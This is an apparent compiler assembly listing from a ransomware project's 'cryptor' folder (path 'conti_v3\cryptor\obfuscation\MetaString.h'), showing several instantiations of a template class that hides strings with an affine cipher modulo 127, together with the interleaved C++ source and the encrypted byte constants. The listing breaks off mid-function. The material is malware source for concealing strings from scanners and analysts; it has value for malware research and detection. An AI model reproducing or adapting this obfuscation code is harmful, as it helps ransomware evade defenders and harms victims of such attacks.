;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5d	 sub	 ecx, 93			; 0000005dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 71	 mov	 BYTE PTR [rcx+1], 113	; 00000071H
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 07	 mov	 BYTE PTR [rcx+3], 7
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 0f	 mov	 BYTE PTR [rcx+5], 15
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 5d	 mov	 BYTE PTR [rcx+8], 93	; 0000005dH
  00023	c6 41 09 5d	 mov	 BYTE PTR [rcx+9], 93	; 0000005dH
  00027	c6 41 0a 5d	 mov	 BYTE PTR [rcx+10], 93	; 0000005dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 70 00 00 00	 mov	 eax, 112		; 00000070H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 31	 mov	 BYTE PTR [rcx+1], 49	; 00000031H
  00007	c6 41 02 70	 mov	 BYTE PTR [rcx+2], 112	; 00000070H
  0000b	c6 41 03 6d	 mov	 BYTE PTR [rcx+3], 109	; 0000006dH
  0000f	c6 41 04 70	 mov	 BYTE PTR [rcx+4], 112	; 00000070H
  00013	c6 41 05 3e	 mov	 BYTE PTR [rcx+5], 62	; 0000003eH
  00017	c6 41 06 70	 mov	 BYTE PTR [rcx+6], 112	; 00000070H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 70	 mov	 BYTE PTR [rcx+8], 112	; 00000070H
  00023	c6 41 09 70	 mov	 BYTE PTR [rcx+9], 112	; 00000070H
  00027	c6 41 0a 70	 mov	 BYTE PTR [rcx+10], 112	; 00000070H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4b	 sub	 ecx, 75			; 0000004bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 68	 mov	 BYTE PTR [rcx+1], 104	; 00000068H
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 60	 mov	 BYTE PTR [rcx+5], 96	; 00000060H
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 5d	 mov	 BYTE PTR [rcx+7], 93	; 0000005dH
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 4b	 mov	 BYTE PTR [rcx+9], 75	; 0000004bH
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 07	 mov	 BYTE PTR [rcx+1], 7
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 20	 mov	 BYTE PTR [rcx+3], 32	; 00000020H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 2e	 mov	 BYTE PTR [rcx+5], 46	; 0000002eH
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 42	 mov	 BYTE PTR [rcx+9], 66	; 00000042H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2b	 sub	 ecx, 43			; 0000002bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
